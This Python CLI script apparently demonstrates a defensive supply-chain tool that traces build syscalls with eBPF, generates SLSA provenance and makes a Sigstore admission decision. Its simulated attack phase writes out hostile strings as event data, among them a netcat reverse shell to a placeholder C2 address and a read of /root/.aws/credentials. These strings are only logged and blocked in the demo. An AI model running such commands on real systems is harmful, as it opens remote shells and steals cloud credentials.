"""
Zero-Trust Supply Chain eBPF Sentinel - Interactive CLI & Attack Simulation
"""

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.syntax import Syntax
import json

from core.ebpf_monitor import EbpfBuildMonitor, BuildSandboxPolicy
from core.slsa_provenance import SlsaProvenanceEngine
from core.sigstore_verifier import SigstoreCosignGate

console = Console()


def run_cli():
    console.print(Panel.fit(
        "[bold cyan]ZERO-TRUST SUPPLY CHAIN eBPF SENTINEL[/bold cyan]\n"
        "[yellow]eBPF Kernel Build Sandbox · SLSA Level 3 Provenance · Sigstore Keyless Gate[/yellow]",
        border_style="cyan"
    ))

    monitor = EbpfBuildMonitor()

    console.print("\n[bold green]=== PHASE 1: SIMULATING LEGITIMATE PACKAGE COMPILATION ===[/bold green]")
    monitor.trace_syscall("openat", 1024, "python3", "setup.py")
    monitor.trace_syscall("connect", 1024, "pip", "pypi.org:443")
    monitor.trace_syscall("openat", 1024, "pip", "requirements.txt")
    console.print("[green][OK] Clean build steps recorded through kernel kprobes.[/green]")

    console.print("\n[bold red]=== PHASE 2: SIMULATING XZ-UTILS / SOLARWINDS SUPPLY CHAIN ATTACK ===[/bold red]")
    console.print("[dim]Malicious setup.py script initiates covert network beacon and secret access...[/dim]")
    
    # Attack vectors
    e1 = monitor.trace_syscall("connect", 1025, "curl", "198.51.100.44:8080 (Adversary C2 Server)")
    e2 = monitor.trace_syscall("openat", 1025, "python3", "/root/.aws/credentials")
    e3 = monitor.trace_syscall("execve", 1025, "sh", "/bin/bash -c nc -e /bin/sh 198.51.100.44")

    # Table of intercepted events
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Syscall", width=12)
    table.add_column("Process", width=14)
    table.add_column("Target / Payload", width=36)
    table.add_column("Sandbox Verdict", width=18)
    table.add_column("Policy Enforcement", width=32)

    for ev in monitor.captured_events:
        verdict = "[green]AUTHORIZED[/green]" if ev.is_authorized else "[bold red]BLOCKED[/bold red]"
        reason = ev.policy_violation_reason or "Compliant with Sandbox Profile"
        table.add_row(ev.syscall, ev.process_name, ev.target, verdict, reason)

    console.print(table)

    # Phase 3: SLSA Provenance Generation
    console.print("\n[bold cyan]=== PHASE 3: SLSA LEVEL 3 IN-TOTO ATTESTATION ENVELOPE ===[/bold cyan]")
    provenance = SlsaProvenanceEngine.generate_provenance(
        artifact_name="ghcr.io/koshag0hil/production-microservice:v2.4.0",
        artifact_digest="sha256:7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
        builder_id="https://github.com/KoshaG0hil/Zero-Trust-Supply-Chain-eBPF-Sentinel",
        repo_uri="https://github.com/KoshaG0hil/Zero-Trust-Supply-Chain-eBPF-Sentinel",
        commit_sha="9a4b8c7e2f1d0a5e8b3c6d7e",
        hermetic_build=False,
        ebpf_verified=False,  # Failed due to violations
        dependencies=[
            {"uri": "pkg:pypi/requests@2.31.0", "digest": "sha256:942c5a2c"}
        ]
    )
    syntax = Syntax(json.dumps(provenance, indent=2), "json", theme="monokai", line_numbers=True)
    console.print(syntax)

    # Phase 4: Sigstore Admission Gate Decision
    console.print("\n[bold red]=== PHASE 4: KUBERNETES / ECS ADMISSION CONTROLLER DECISION ===[/bold red]")
    sig = SigstoreCosignGate.simulate_keyless_sign(
        provenance,
        oidc_issuer="https://token.actions.githubusercontent.com",
        signer_identity="KoshaG0hil/Zero-Trust-Supply-Chain-eBPF-Sentinel"
    )

    admitted, reason = SigstoreCosignGate.evaluate_admission_policy(
        sig,
        trusted_issuer="https://token.actions.githubusercontent.com",
        trusted_identity_prefix="KoshaG0hil",
        ebpf_audit=monitor.get_audit_summary()
    )

    status_color = "green" if admitted else "bold red"
    console.print(f"[{status_color}]DECISION: {reason}[/{status_color}]\n")


if __name__ == "__main__":
    run_cli()
